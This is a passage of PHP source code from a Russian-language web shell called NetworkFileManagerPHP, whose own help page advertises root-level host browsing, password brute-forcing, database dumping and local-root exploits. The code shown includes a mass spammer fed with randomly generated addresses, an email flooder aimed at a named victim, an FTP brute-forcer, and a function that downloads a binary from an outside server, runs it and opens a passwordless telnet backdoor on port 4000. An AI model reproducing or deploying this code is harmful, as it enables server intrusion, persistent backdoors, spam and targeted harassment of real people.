<td align=left width=200>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='domen[]'>&nbsp;&nbsp;</td>
</tr>
<tr><td width=500 align=center colspan=2><input type='submit' value='Генерить' class=button1 $style_button>
</td></tr>
 
 </form></table>";
// согласные
function s() {
   $word="qwrtpsdfghklzxcvbnm";
   return $word[mt_rand(0,strlen($word)-1)];
}
// гласные
function g() {
   $word="eyuioa";
   return $word[mt_rand(0,strlen($word)-2)];
}
// цифры
function c() {
   $word="1234567890";
   return $word[mt_rand(0,strlen($word)-3)];
}
// согласные с гласными
function a() {
   $word=array('wa','sa','da','qa','ra','ta','pa','fa','ga','ha','ja','ka','la','za','xa','ca','va','ba','na','ma');
   $ab1=count($word);
   return $wq=$word[mt_rand(0,$ab1-1)];
}

function o() {
   $word=array('wo','so','do','qo','ro','to','po','fo','go','ho','jo','ko','lo','zo','xo','co','vo','bo','no','mo');
   $ab2=count($word);
   return $wq2=$word[mt_rand(0,$ab2-1)];
}
function e() {
   $word=array('we','se','de','qe','re','te','pe','fe','ge','he','je','ke','le','ze','xe','ce','ve','be','ne','me');
   $ab3=count($word);
   return $wq3=$word[mt_rand(0,$ab3-1)];
}

function i() {
   $word=array('wi','si','di','qi','ri','ti','pi','fi','gi','hi','ji','ki','li','zi','xi','ci','vi','bi','ni','mi');
   $ab4=count($word);
   return $wq4=$word[mt_rand(0,$ab4-1)];
}
function u() {
   $word=array('wu','su','du','qu','ru','tu','pu','fu','gu','hu','ju','ku','lu','zu','xu','cu','vu','bu','nu','mu');
   $ab5=count($word);
   return $wq5=$word[mt_rand(0,$ab5-1)];
}

function name0() {   return c().c().c().c();                    }
function name1() {   return a().s();        }
function name2() {   return o().s();        }
function name3() {   return e().s();        }
function name4() {   return i().s();        }
function name5() {   return u().s();        }
function name6() {   return a().s().g();        }
function name7() {   return o().s().g();        }
function name8() {   return e().s().g();        }
function name9() {   return i().s().g();        }
function name10() {   return u().s().g();        }
function name11() {   return a().s().g().s();        }
function name12() {   return o().s().g().s();        }
function name13() {   return e().s().g().s();        }
function name14() {   return i().s().g().s();        }
function name15() {   return u().s().g().s();        }


$cool=array(1,2,3,4,5,6,7,8,9,10,99,100,111,666,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999,2000,2001,2002,2003,2004,2005);
$domain1=array('mail.ru','hotmail.com','aol.com','yandex.ru','rambler.ru','bk.ru','pochta.ru','mail333.com','yahoo.com','lycos.com','eartlink.com');
$d1c=count($domain1);

function randword() {
   global $cool,$cool2;
   $func="name".mt_rand(0,15);
   $func2="name".mt_rand(0,15);
   switch (mt_rand(0,2)) {
      case 0: return $func().$func2();
      case 1: return $func().$cool[mt_rand(0,count($cool)-9)];
	  case 2: return $func();
      default: return $func();
   }
 }

if (@unlink("email.txt") < 0){
echo "пусто";
exit;
}
$file="email.txt"; 


if($chislo){


 $cnt3=mt_rand($chislo,$chislo);
   for ($i=0; $i<$cnt3; $i++) {
   $u=randword();
  if(!isset($check_box)){
  
  if ( IsSet($_POST["domen"]) && sizeof($_POST["domen"]) > 0 )
{
   $domen = $_POST["domen"];
      foreach( $domen as $k=>$v )
   {
       $d=$domen[mt_rand(0,$v-1)];
   
   }
}
$f=@fopen(email.".txt","a+");
   fputs($f,"$u@$d\n");
   }else{
  
   $d=$domain1[mt_rand(0,$d1c-1)];
   $f=@fopen(email.".txt","a+");
   fputs($f,"$u@$d\n");
   }
   
  }
   $address = $file;
  if (@file_exists($address)) {
    if($changefile = @fopen ($address, "r")) {
      $success = 1;
    } else  {
    echo " Не найден  файл <b>\"".$address."\"</b> !<br>";
  }
  
   if ($success == 1) {
   echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>";
    echo "<tr><td align=center class=pagetitle width=500>  Сгенеренно всего <b>$chislo</b> email.</td></tr>";
	echo "<tr><td align=center> ";
    echo "<textarea name=\"email\" rows=\"13\" cols=\"58\" class=inputbox>";
    while($line = @fgets($changefile,1024)) {
      echo @trim(stripslashes($line))."\n";
    }
    echo"</textarea></td></tr></table>";
	}
	}
if (!isset($action)){ 
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form action='$PHP_SELF?action=spam1&status=ok' method=post enctype='multipart/form-data'>
 <tr><td align=center class=pagetitle colspan=2><b>Главные настройки спамера</b></font></b></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;От кого письмо:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='from' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Куда ответ:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='otvet' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Интервал отправки (сек):</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='wait' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Тема сообщения:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='subject' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Текст письма:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<textarea name='body' rows='13' cols='60' class=inputbox> </textarea></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Файл:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='file' name='filess' size=30></td></tr>
<tr><td width=500 align=center colspan=2>
<input type='submit' value='Генерить' class=button1 $style_button >
<INPUT TYPE='hidden' NAME='$chislo'>
</td></tr>
 </form></table>";
}
}
}
function del() {
global $PHP_SELF;
$file_to_delete = basename("$PHP_SELF"); 
@chmod("$file_to_delete", 0777); 
if (@unlink("$file_to_delete") < 0){
echo "пусто";
exit;
}
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Удаление NFM</b></font></b></td></tr>
</table>";
}

function spam1() {
 global $status, $from, $otvet, $wait, $subject, $body, $filess, $chislo, $action;
 set_time_limit(0);
ignore_user_abort(1);

 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Отправка писем с задаными опциями</b></font></b></td></tr>
</table>";

	
 error_reporting(63); if($from=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <От кого письмо>')</script>";exit;}
 error_reporting(63); if($otvet=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Куда ответ>')</script>";exit;}
 error_reporting(63); if($wait=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Интервал отправки>')</script>";exit;}
 error_reporting(63); if($subject=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Тема сообщения>')</script>";exit;}
 error_reporting(63); if($body=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Тело письма>')</script>";exit;}

  $address = "email.txt";
  $counter = 0;
 if (!isset($status)) echo "что-то не так";
 else {
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <tr><td align=center bgcolor=#FFFFCC>Открываем файл <b>\"".$address."\"</b> ... <br></td></tr>
";
  if (@file_exists($address)) {
 echo "
  <tr><td align=center bgcolor=#FFFFCC>Файл <b>\"".$address."\"</b> найден...<br></td></tr>
";
    if($afile = @fopen ($address, "r")) {
 echo "
 <tr><td align=center bgcolor=#FFFFCC>Файл <b>\"".$address."\"</b> открыт для чтения...<br></td></tr>
";
    } else {
 echo "
 <tr><td align=center class=pagetitle>Файл <b>\"".$address."\"</b> не могу открыть для чтения...<br></td></tr>
";
    }
  } else {
    echo "There is no file <b>\"".$address."\"</b> !<br>";
    $status = "не могу найти файла \"".$address."\" ...";
  }
 echo "
 <tr><td align=center bgcolor=#FFFFCC>Начинаем чтение из файла <b>\"".$address."\"</b> ...<br></td></tr>
 </table>";
  if (@file_exists($address)) {

    while (!feof($afile)) {

      $line = fgets($afile, 1024);
      $line = trim($line);
      $recipient = "";
      $recipient = $line;
	  
  if ($filess) {
	$content = fread(fopen($filess,"r"),filesize($filess));
		$content = chunk_split(base64_encode($content));
		$name = basename($filess);
   } else {
   $content ='';
   }
      $boundary = uniqid("NextPart_");
	    
	  $header    = "From: ".$from."\r\n";
	  $header   .= "Reply-To: ".$otvet."\r\n";
	  $header   .= "Errors-To: ".$otvet."\r\n";
      $header   .= "X-Mailer: MSOUTLOOK / ".phpversion()."\r\n";
	  $header .= "Content-Transfer-Encoding: 8bits\n";
      $header .= "Content-Type: text/html; charset=\"windows-1251\"\n\n";
	  $header .= $body;
	  $header   .="--$boundary\nContent-type: text/html; charset=iso-8859-1\nContent-transfer-encoding: 8bit\n\n\n\n--$boundary\nContent-type: application/octet-stream; name=$filess \nContent-disposition: inline; filename=$filess \nContent-transfer-encoding: base64\n\n$content\n\n--$boundary--";

		
	  $pattern="#^[-!\#$%&\"*+\\./\d=?A-Z^_|'a-z{|}~]+";
      $pattern.="@";
      $pattern.="[-!\#$%&\"*+\\/\d=?A-Z^_|'a-z{|}~]+\.";
      $pattern.="[-!\#$%&\"*+\\./\d=?A-Z^_|'a-z{|}~]+$#";
	  
      if($recipient != "")
      {
        if(preg_match($pattern,$recipient))
        {
          echo "
		  <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <tr><td align=center class=pagetitle>Отправляем письмо на <b>\"".$recipient."\"</b>...отправлено ";
        

            if(@mail($recipient, stripslashes($subject), stripslashes($header))) {
              $counter = $counter + 1;
              echo "<b>[\"".$counter."\"]</b> ".date("H:i:s")."</td></tr> </table>";
            } else {
              echo "<tr><td align=center class=pagetitle>Не корректный email, сообщение не отправлено !</td></tr> </table>";
            }
          } else {
              $counter = $counter + 1;
             
          }
        } else {
           echo "<br>";
        }
      $sec = $wait * 1000000;
      usleep($sec);

    }

    if($otvet != "")
    {

      if(preg_match($pattern,$otvet))
      {
		echo " <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
		  <tr><td align=center class=pagetitle>Отправляем письмо на <b>\"".$otvet."\"</b> для проверки";
        $subject = "".$subject;

        if(@mail($otvet, stripslashes($subject), stripslashes($message), stripslashes($header))) {
          $counter = $counter + 1;
          echo " отправлено... <b>[\"".$counter."\"]</b> ".date("H:i:s")."</td></tr> </table>";
        } else {
          echo "<tr><td align=center class=pagetitle>не отправлено...</td></tr> </table>";
        }
      } else {
          echo "<tr><td align=center class=pagetitle>указан не правльный email.</td></tr> </table>";
      }
    } else {
    }

    if(@fclose ($afile)) {
      echo "
	   <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
  <tr><td align=center class=pagetitle>Файл <b>\"".$address."\"</b> успешно закрыт!<br></td></tr> </table>";
    } else {
      echo "
	   <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
  <tr><td align=center class=pagetitle>Файл <b>\"".$address."\"</b> не могу закрыть!<br></td></tr> </table>";    }
  } else {
    echo "не могу прочитать файл  <b>\"".$afile."\"</b> ...<br>";
  }

     $status2 ="Статус: ".$counter." emailов отослано.";
    echo "<br>";
    echo "
	  <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
  <tr><td align=center class=pagetitle>$status2</td></tr> </table>"; 
   
}       
}

# помощь
function help() {
 global $action,$REMOTE_ADDR,$HTTP_REFERER;
 echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Описание скрипта NetworkFileManagerPHP</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC>

<blockquote><br>
Данный скрипт писался вначале только для администратирования своего хостинга, но в процессе написания 
он позволял свободно перемещаться по папкам хостинга и просматривать различную информацию, 
которая доступна только root, в процессе эволюции скрипта я его дополнил уникальными свойствами, 
которые доступны всего в одном файлике, все остальные файлы необходимые для его работы создаются в папке,
где залит NFM. То есть данный скрипт полностью автономен за исключением эксплойтов, которые хранятся на моем 
сервере и доступны для скачивания, посредством PHP.<br><br>

<b>NetworkFileManagerPHP</b> - скрипт для полного администратирования своего сайта, а также и хостинга, 
где этот сайт хостится.<br><br>
В написании данного скрипта были задействованы некоторые авторские разработки, уважаемых программистов:<br>
- идея использования алиасов в целях облегчения набора команд <b>(Rush)</b><br>
- простенький Брутфорсер, который проверяет пароль по его логину <b>(TerraByte)</b><br>
- идея с Mysql, спасибо польским программистам<br>
- остальные идеи мои <b>(xoce)</b><br>
- Спасибо за тестирование скрипта всему каналу #hack.ru<br><br>

<b>Возможности NetworkFileManagerPHP</b><br>
1. Возможность просматривать файлы хостинга 2-мя способами (актуально если один из них отключен на хостинге, просмотр осуществляется через fopen и cmd)<br> 
2. Использование альясов, то есть уже готовые команды, которые прописаны в раскрывающем списке (интересны новичкам, которые не знают линукса) <br>
3. Сканирование сервера на открытые порты, показывает все открытые порты на сервере и их предназначение. <br>
4. Брут сервера. Вскрипт включен простенький брут сервера, проверка пароля по его логину.(данные о пользователях беруться из файла /etc/passwd). Все подошедшие пароли записываются в файл с именем хостинга.<br> 
5. Дамп базы mysql. Возможность сдампить любую базу Mysql, находящуюся на этом хостинге. <br>
6. Установка bash shella. Вы через скрипт вы можете получить полноценный бакдор, который открывает на 4000 порту телнет соединение. (необходим для рутания сервера)<br> 
7. Защищен закриптованным паролем.<br> 
8. Добавлена возможность архивации любой папки на хостинге с присвоением ей уникального имени, которое генерится из 6 символов.<br> 
9. Возможность послать себе на мыло любой файл находящийся на сервере (мыло править в самом скрипте на свое) <br>
10. Просмотр локально картинок (jpg, jpeg,gif,png), вам теперь не нужны пароли от порно ресурсов, вы можете все просмотреть локально!!!<br> 
11. Просмотр локально видео (avi, mpg, mpeg), чтобы не качать все подряд с порно ресурсов, вы можете их просмотреть у себя через Windows Media Player!!!<br> 
12. Добавлена база публичных локальных эксплойтов таких как ptrace, mremap, также в скрипт включены некоторые полезные программки BNC (раздел будет постоянно пополняться с новыми версиями)<br> 
Добавлена база приватных эксплойтов только локальный рут) <br>
- brk <br>
- sendmail 8.1.*<br> 
- mremap_pte <br>
- r00t <br>
- ku3 <br>
- ex_bru <br>
- ptrace/kmod<br> 
- mremap2 <br>
13. Перебор паролей MD5 до 32 символов(теперь вам не нужен переборщик John The Riper любой хостинг, у которого включено PHP сделает это за вас, причем все абсолютно легально, работает даже при обрыве связи, то есть один раз запустили и ушли спать, проснулись а файлик с расшифрованным паролем уже в дериктории где залит NFM)<br>
14. Подбор паролей к FTP с созданием листа с паролями налету ( в лист паролей входит:50 самых популярных паролей, они первыми идут в расшифровку, потом подстановка к логину чисел, ну а потом рандомные пароли которые создаются с использованием гласных и согласных букв, получая человекоподобные выражения, которые могут использоваться в паролях)<br> 
15. включен уникальный спамер мыл, работающий на любом хостинге, все базы будет генерить рандомно, валидность таких баз будет 40-45% ( используется уникальный алгоритм создания имен )<br>
16. возможность загрузить любой файл с любого хостинга не прибегая к функции wget ( все реализовано средствами php, теперь можно качать гигабайтами.... работает не на всех хостингах )<br>
17. Удаление on-line
18. Софт наказания - флуд email, Easy Flood и Hard Flood.
<b>Данный скрипт предупреждает администраторов хостинга, что пора латать дыры.
Этим скриптом мы лишь хотели показать, что с апачем шутки плохи.</b><br><br>
<b>Как нас найти:</b><br>
Irc server: irc.megik.net:6667 /join #hack.ru<br>
Увидимся в сети!!!<br></td></tr></table><br></blockquote>
</td></tr>
</table>";
}

function exploits($dir) {
 global $action,$status, $file3,$file2,$tm,$PHP_SELF,$HTTP_HOST,$style_button, $public_site, $private_site, $private, $public, $title_ex, $title_exp;
if (!isset($status)) upload_exploits(); 

else 
{

$data = implode("", file($file3)); 
$fp = @fopen($file2, "wb"); 
fputs($fp, $data); 
$ok = fclose($fp); 
if($ok) 
{ 
$size = filesize($file2)/1024; 
$sizef = sprintf("%.2f", $size);
print "".exec("chmod 777 $public[1]")."";
print "".exec("chmod 777 $public[2]")."";
print "".exec("chmod 777 $public[3]")."";
print "".exec("chmod 777 $private[1]")."";
print "".exec("chmod 777 $private[2]")."";
print "".exec("chmod 777 $private[3]")."";
print "".exec("chmod 777 $private[4]")."";
print "".exec("chmod 777 $private[5]")."";
print "".exec("chmod 777 $private[6]")."";
print "".exec("chmod 777 $private[7]")."";
print "".exec("chmod 777 $private[8]")."";

print "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Вы загрузили: <b>файл размером</b> (".$sizef."кБ) </font></center></td></tr></table>"; 
} 
else 
{ 
print "Что-то не так."; 
} 
} 
}


# FTP-брут
function ftp() {
 global $action, $ftp_server, $filename, $HTTP_HOST;
 ignore_user_abort(1);
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=pagetitle>FTP-server: <b>$ftp_server</b></td></tr>";

 $fpip = @fopen ($filename, "r");
 if ($fpip) {
  while (!feof ($fpip)) { 
   $buf = fgets($fpip, 100);
   ereg("^([0-9a-zA-Z]{1,})\:",$buf,$g);
   $conn_id=ftp_connect($ftp_server);
   if (($conn_id) && (@ftp_login($conn_id, $g[1], $g[1]))) {
   
   $f=@fopen($HTTP_HOST,"a+");
   fputs($f,"$g[1]:$g[1]\n");
     echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=pagetitle><b>Connected with login:password - ".$g[1].":".$g[1]."</b></td></tr></table>";
    
   ftp_close($conn_id);
   fclose($f);
   } else {
    echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#FFFFCC BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center>".$g[1].":".$g[1]." - <b>failed</b></td></tr></table>";
   }
  }
 }
}

function tar() {
 global $action, $filename;
 set_time_limit(0);
 echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Архивация данных</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br><blockquote>В связи с различными настройками серверов, я не стал полностью автоматизировать скрипт под каждый сервер. Вам только останется подправить точные пути к папке домена и нажать на ввод, все данные расположенные в выбранной папке заархивируются в архив tar.gz.<br><br>
<b>Внимание!!!</b><br>Так как файл <b>passwd</b> может быть большим, то открытие всех пользователей данного хостинга потребует определенного времени.<br><br>
<b>Рекомендуется!!!</b><br>Открыть данную опцию в отдельном окне, чтобы при просмотре хостинга обращаться к ней и архивировать информацию которая вас заинтересует.</blockquote></td></tr>
</table><br>";

$http_public="/public_html/";
$fpip = @fopen ($filename, "r");
if ($fpip) {
 while (!feof ($fpip)) { 
  $buf = fgets($fpip, 100);
  ereg("^([0-9a-zA-Z]{1,})\:",$buf,$g);
  $name=$g[1];
  echo "
<TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<form method='get' action='$PHP_SELF' >
<tr><td align=center colspan=2 class=pagetitle><b>Архивация <u>$name.tar.gz</u>:</b></td></tr>
<tr>
<td valign=top><input type=text name=cm size=90 class='inputbox'value='tar -zc /home/$name$http_public -f $name.tar.gz' ></td>
<td valign=top><input type=submit value='Дави' class=button1 $style_button></td>
</tr></form></table>";
  }
 } 
}



# Установка шела
function bash() {
 global $action, $port_bind, $pass_key;

echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Установка шела</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br>Данный шел устанавливается на 4000 порт, доступ без пароля по телнет соединению</td></tr>
</table><br>";

echo "
<TABLE CELLPADDING=0 CELLSPACING=0 width='500' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b> Данные по шелу записаны в файл <u><i>s</i></u></b></td></tr>";

echo "<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; ".exec("wget http://vzlomanet.x25.net.ru/adm/exploits/bash/s")."</b> Cкачиваем...</td></tr>";
echo "<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; ".exec("chmod 777 s")."</b> Устанавливаем права...</td></tr>";
echo "<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; ".exec("./s")."</b> Запускаем...на 4000 порт</td></tr>";
# echo "<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; ".exec("rm s")."</b> Удаляем <u>s</u>...</td></tr>";
echo"</table>";

 }
 
 function flud() {
 global $action, $check_box, $status, $emailflood, $kol, $wait, $sizeletter, $subject, $body;
set_time_limit(0); 
ignore_user_abort(1); 

echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Флудер Email</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br><blockquote>Так уж получилось, что работая в интернете, мы частенько нарываемся на мошенников или нас подставляют. 
Но если мы имеем мыло обидчика, то мы можем ему подговнить житие. Для этих целей и писалась данная опция. С помощью этой опции вы сможете зафлудить негодяя!!!</blockquote>
</td></tr>
</table><br>";
echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form action='$PHP_SELF?action=flud' method=post>
 <tr><td align=left valign=top colspan=4 class=pagetitle>
 &nbsp;&nbsp;<b>Генератор флуда:</b></td></tr>
 <tr> <tr><td align=left valign=top colspan=4 bgcolor=#FFFFCC width=500>
 &nbsp;&nbsp;Для качества флуда, флудер Email, разбит на две версии: <br>
 &nbsp;<b>1.</b> Easy Flood - это тупой флуд, но более быстрый, но его легко удалить, в сутки засирается ящик около 100000 писем, некоторые сервера фильтруют его<br>
 &nbsp;<b>2.</b> Hard Flood - продвинутый флуд, но более ресурсоемкий, подделывает от кого флуд, а также умеет еще кучу возможностей</td></tr>
 <tr><td align=left class=pagetitle>&nbsp;&nbsp;<input type='radio' name='check_box' value ='1'>&nbsp;&nbsp; <b>Easy Flood</b></td></tr>
 <tr><td align=left class=pagetitle>&nbsp;&nbsp;<input type='radio' name='check_box' value ='2'>&nbsp;&nbsp; <b>Hard Flood</b></td></tr>

<tr><td width=500 align=center colspan=2><input type='submit' value='Начать' class=button1 $style_button>
</td></tr>
 
 </form></table>";
 
if ($check_box == "1"){ 
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form action='$PHP_SELF?action=flud&status=easy' method=post>
 <tr><td align=center class=pagetitle colspan=2><font color=#76A8AB><b> .:Easy Flood:. </b></font></b></td></tr>
<tr><td align=left class=pagetitle width=250>&nbsp;&nbsp;Email гада:</td>
<td align=left width=250><input class='inputbox' type='text' name='emailflood' size=45></td></tr>
<tr><td align=left class=pagetitle width=250>&nbsp;&nbsp;Количество писем:</td>
<td align=left width=250><input class='inputbox' type='text' name='kol' size=15></td></tr>
<tr><td align=left class=pagetitle width=250>&nbsp;&nbsp;Интервал отправки (сек):</td>
<td align=left width=250><input class='inputbox' type='text' name='wait' size=15></td></tr>
<tr><td align=left class=pagetitle width=250>&nbsp;&nbsp;Размер письма (кб):</td>
<td align=left width=250><input class='inputbox' type='text' name='sizeletter' size=45></td></tr>
<tr><td align=left class=pagetitle width=250>&nbsp;&nbsp;Тема сообщения:</td>
<td align=left width=250><input class='inputbox' type='text' name='subject' size=45></td></tr>
<tr><td align=left class=pagetitle width=250>&nbsp;&nbsp;Текст письма:</td>
<td align=left width=250><textarea name='body' rows='13' cols='50' class=inputbox> </textarea></td></tr>
<tr><td width=500 align=center colspan=2>
<input type='submit' value='Генерить' class=button1 $style_button >
<INPUT TYPE='hidden' NAME='$chislo'>
</td></tr>
 </form></table>";
 

} 


 if ($status == "easy"){
  error_reporting(63); if($emailflood=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Email гада>')</script>";exit;}
 error_reporting(63); if($kol=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Количество писем>')</script>";exit;}
 error_reporting(63); if($wait=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Интервал отправки>')</script>";exit;}
 error_reporting(63); if($sizeletter=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Размер письма>')</script>";exit;}
 error_reporting(63); if($subject=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Тема сообщения>')</script>";exit;}
 error_reporting(63); if($body=="") { print
"<script>history.back(-1);alert('Не заполнено поле: <Тело письма>')</script>";exit;}

 
$text=strlen($body)+1; 
$sizeletter_kb=(1024/$text)*$sizeletter;
$sizeletter_kb=ceil($sizeletter_kb);

for ($i=1; $i<=$sizeletter_kb; $i++) {
$msg=$msg.$body." ";
}

     
for ($i=1; $i<=$kol; $i++){
 if($emailflood != "") {
 
@mail($emailflood, $body, $msg, "From: $subject");
 $sec = $wait * 1000000;
      usleep($sec);
	  }
	 
}

}

 
 }
 
 
 
 
 
 
 
 
 
 
 
 
 
function crypte() {
 global $action,$md5a,$sha1a,$crc32, $key,$string;
echo "<br>
<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
<tr><td align=center class=pagetitle><b>Криптование данных</b></font></b></td></tr>
<tr><td bgcolor=#FFFFCC><br><blockquote>На данный момент в интернете существует огоромное колличество программ и скриптов, которые используют различные методы шифрования паролей, 
с помощью NFM вы можете получить доступ к изменению этих данных, но бывает нужным изменить данные на свои, для этого я выбрал самые популярные методы шифрования.</blockquote></td></tr>
</table>";

echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=crypte' method=post>
 <tr><td align=left valign=top colspan=3 class=pagetitle>
 &nbsp;&nbsp;<b>Популярные методы шифрования, поддерживаемые библиотекой MHASH:</b></td></tr>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>MD5 </b>(самый распрастраненный метод шифрования данных)</td></tr>
 <tr>
 <td class=pagetitle width=400>&nbsp;Результат:&nbsp;&nbsp;<font color=#ffffcc><b>".md5($md5a)."</b></font></td>
 <td class=pagetitle width=100>&nbsp;Ввод:&nbsp;<font color=red><b>".$md5a."</b></font></td></tr>
 <tr><td align=center width=400><input class='inputbox'type='text' name='md5a' size='50' value='' id='md5a'></td>
 <td align=center width=100><input type='submit' value='Crypt MD5' class=button1 $style_button></td></tr>
 
 </form></table>";
 echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=crypte' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC>
 &nbsp;&nbsp;<b>SHA1 </b>(тоже довольно популярный метод шифрования данных)</td></tr>
 <tr>
 <td class=pagetitle width=400>&nbsp;Результат:&nbsp;&nbsp;<font color=#ffffcc><b>".sha1($sha1a)."</b></font></td>
 <td class=pagetitle width=100>&nbsp;Ввод:&nbsp;<font color=red><b>".$sha1a."</b></font></td></tr>
 <tr><td align=center width=400><input class='inputbox' type='text' name='sha1a' size='50' value='' id='sha1a'>
 </td><td align=center width=100><input type='submit' value='Crypt SHA1' class=button1 $style_button></td></tr>
 
 </form></table>";
echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=500 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 <form enctype='multipart/form-data' action='$PHP_SELF?action=crypte' method=post>
 <tr><td align=left valign=top colspan=3 bgcolor=#FFFFCC width=500>
 &nbsp;&nbsp;<b>CRC32 </b>(в основном используется при вычислении контрольных сумм для проверки целостности данных, но и в некоторых форумах в качестве шифровки паролей)</td></tr>
 <tr>
 <td class=pagetitle width=400>&nbsp;Результат:&nbsp;&nbsp;<font color=#ffffcc><b>".crc32($crc32)."</b></font></td>
